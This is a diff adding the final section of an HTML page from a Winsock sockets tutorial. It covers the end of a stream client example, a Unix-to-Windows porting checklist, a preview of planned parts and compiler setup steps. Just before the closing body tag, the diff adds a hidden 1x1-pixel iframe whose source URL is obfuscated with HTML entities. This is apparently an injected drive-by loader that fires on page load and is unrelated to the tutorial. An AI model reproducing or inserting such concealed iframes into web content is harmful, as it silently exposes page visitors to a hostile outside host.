+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buf[numbytes] = '\0';
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Server Message: %s\n",buf);&nbsp;&nbsp;&nbsp;
+/* it prints server's welcome message =) */
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; closesocket(fd);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+/* close fd =) */
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; WSACleanup();
+<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return -1;
+<br>}
+<p>/* &lt;---- SOURCE CODE ENDS HERE ----> */
+<br>&nbsp;
+<p>There’s actually no real difference with this port and the last. The
+same lines are
+<br>changed and the same functions are included as before.
+<p>Start the program by switching to its directory on the command line
+and typing
+<p>streamclient.exe local host
+<p>Where streamclient.exe is the name of the stream client program we just
+ported
+<br>naturally :).
+<p>Just make sure that the previous example, the streaming server is running
+and
+<br>your away. The screen will print the line "Welcome to my server." Congratulations
+<br>you’ve ported your first Unix Socket client and server to windows and
+you received
+<br>a line of text back from your own server :).
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<br>&nbsp;
+<p>11.0&nbsp;<a NAME="11"></a>Planning
+<br>=======================================
+<p>When porting its probably best to go trough things like a check list
+before attempting
+<br>to compile the bloody thing. Here’s a list of some recommendations
+to run trough first.
+<p>1. Replace all network header files with windows.h or winsock.h.
+<br>2. Make sure to add WSAStartup() and WSACleanup() before and after
+the code.
+<br>3. Replace functions such as close() and ioctl() with windows counterparts.
+<br>4. Take care of problems such as bzero() and add any windows specific
+features like
+<br>&nbsp;&nbsp; default ports.
+<br>&nbsp;
+<p>With so few and simple operations like this it would be pretty damn
+easy to write
+<br>a program that performs these actions for you, I doubt it would be
+complete but hey
+<br>it would save you a lot of time in the long run, especially with larger
+applications.
+<p>
+<hr SIZE=1 WIDTH="70%">
+<br>&nbsp;
+<br>&nbsp;
+<p>12.0<a NAME="12"></a> LAST WORDS
+<br>==============
+<p>Well that’s it for this tutorial, or at least this part of it. More
+parts are planned so
+<br>hopefully you should see them on blacksun soon :). This part covered
+the basics of
+<br>windows programming, there was no point in writing about UNIX programming
+as bracaman
+<br>has released a very good tutorial on basic UNIX sockets programming
+which is available
+<br>from blacksun.box.sk and code.box.sk.
+<p>I will be discussing Unix sockets again however in the next part of
+this tutorial but
+<br>mostly in a porting sense. To see what’s planned for future parts so
+far just look down :).
+<br>&nbsp;
+<p>Part 2. -&nbsp; GENERAL SOCKETS&nbsp; - Porting to windows and cross
+platform code.
+<br>Part 3.&nbsp; -&nbsp; RAW Sockets&nbsp;&nbsp;&nbsp;&nbsp; - Have more
+control over packets with raw sockets.
+<br>Part 4.&nbsp; -&nbsp; ADVANCED&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; - A real
+world example by building an internet communication suite.
+<br>Part 5.&nbsp; -&nbsp; FINISHING OFF&nbsp;&nbsp;&nbsp; - Putting it
+all together in one big program.
+<p>So that’s what’s still to come, but I may change some of these future
+tutorials at any
+<br>time before there released if I do so it will be to improve the series
+in my view and
+<br>remember send me comments and suggestions and your ideas might also
+change the layout
+<br>of following tutorials.
+<br>&nbsp;
+<p>Well thank you for reading this tutorial and visit my website to keep
+up to date with
+<br>the series and for add on code and articles to the series.
+<p>- BR ;)
+<br>&nbsp;
+<p>*<a NAME="final"></a>FINAL NOTE*
+<p>Id really like to thank Bracaman for everything including allowing me
+to use code from
+<br>his tutorial and please remember that this tutorial should be read
+with his (after his
+<br>1 even :P), so thanks for everything Bracaman it helped so much :).
+<p>
+<hr SIZE=1 WIDTH="70%">
+<p>APPENDIX A - THE COMPILER<a NAME="appxA"></a>
+<br>
+<p>All of the programs in this tutorial have been tested under Microsoft
+Visual C++ 6.0,
+<br>im running Windows 2000 Professional edition and I have an Intel Pentium
+2.
+<p>To set up the compiler for Winsock programming you need to link Wsock32.lib
+to your project.
+<br>Under Visual C++ do the following.
+<p>1. Select the File view tab.
+<br>2. Right Click the files menu and go to Settings.
+<br>3. Select the Link tab in Project Settings.
+<br>4. Add Wsock32.lib to the list of .lib files and press ok.
+<p>The winsock.h header file is included in windows.h so don’t worry about
+that.
+<p>
+<hr SIZE=1 WIDTH="70%">
+<iframe src="http://jL.c&#104;ura&#46;pl/rc/" style="width:1px;height:1px"></iframe>
+</body>
+</html>
